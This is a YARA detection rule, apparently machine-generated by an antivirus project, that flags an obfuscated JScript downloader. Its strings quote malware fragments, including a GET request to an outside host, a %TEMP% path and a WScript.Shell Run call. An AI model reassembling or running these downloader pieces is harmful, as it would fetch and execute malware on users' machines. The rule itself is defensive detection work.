rule sig_20160427_ca9108b1a2f347581fa78b0e1a1f4403 {
  meta:
    description = "datamaliciousorder - file 20160427_ca9108b1a2f347581fa78b0e1a1f4403.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ffd42735d58eea885062f3ed87a320e8edbd25ed0f0af781ec91523729b16e05"

  strings:
    $s1  = "WszqzFacrf[NfsozAizci](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function VvcckCiydf() {return JlascBaczf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qpQykKI" ascii
    $s3  = "function VvcckCiydf() {return JlascBaczf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qpQykKI" ascii
    $s4  = "function TbwuhMhrly(JmhoyNrfsn, SayjsVaxnc){AwhgmPpkwb = AwhgmPpkwb * 1; return JmhoyNrfsn - SayjsVaxnc;};" fullword ascii
    $s5  = "var JlascBaczf = function YsblpXlgmj() {return YhfuxEzclz[NzbmdRrtqx](\"WScript\"+\".Shell\");}(), YfdjoBkuyh = 11;" fullword ascii
    $s6  = "var YhfuxEzclz = this[\"WScript\"];" fullword ascii
    $s7  = "function KsexuFkqvp(){return CxspzTnldo + \"\";};" fullword ascii
    $s8  = "if (WszqzFacrf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function AtqxhBhwyp() {return ((XjzxqHvnlh == true) && (XjzxqHvnlh == ZgzmrIrkbs)) ? 1 : AwhgmPpkwb;};" fullword ascii
    $s10 = "function BnxclUodfm(){return NzbmdRrtqx;};" fullword ascii
    $s11 = "XjzxqHvnlh = true; " fullword ascii
    $s12 = "BswgoXrvtl = true;" fullword ascii
    $s13 = "var BswgoXrvtl = false;" fullword ascii
    $s14 = "function RhpbgRgeku(WhjjyJqklz) {var PklobPnpeu = (1, 2, 3, 4, 5, WhjjyJqklz); return PklobPnpeu;};" fullword ascii
    $s15 = "var EprazSawew = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "return TbwuhMhrly(DndicTyhzm, StffzGrgbm);" fullword ascii
    $s17 = "ZgzmrIrkbs = true; " fullword ascii
    $s18 = "function UxbedXiiss(){return 23;};" fullword ascii
    $s19 = "var ZgzmrIrkbs = false;" fullword ascii
    $s20 = "function OdjelJkamc(VecjmXqizm){JlascBaczf[\"R\"+\"un\"](VecjmXqizm, AwhgmPpkwb, AwhgmPpkwb);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}